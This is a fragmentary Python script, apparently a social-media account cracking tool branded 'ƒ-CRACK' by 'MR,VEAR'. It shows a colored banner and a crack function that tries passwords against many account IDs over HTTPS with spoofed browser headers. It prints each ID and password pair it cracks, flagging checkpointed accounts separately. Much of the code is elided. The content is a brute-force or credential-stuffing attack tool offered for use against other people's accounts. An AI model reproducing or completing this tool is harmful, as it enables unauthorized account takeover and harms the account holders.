...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m CRACER BY : 🔥MR,VEAR🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   ƒ-CRACK
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m VERSION   :  \033[1;31m V=[14]
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [MR,VEAR] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
   ...
   "scheme": 'https', 
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[MR,VEAR-CP] {idf} | {pw}')     
				...
				print ()
				print(f'\r\r\x1b[38;5;46m[MR,VEAR-OK💉] '+idf+ ' | '+pw+'')
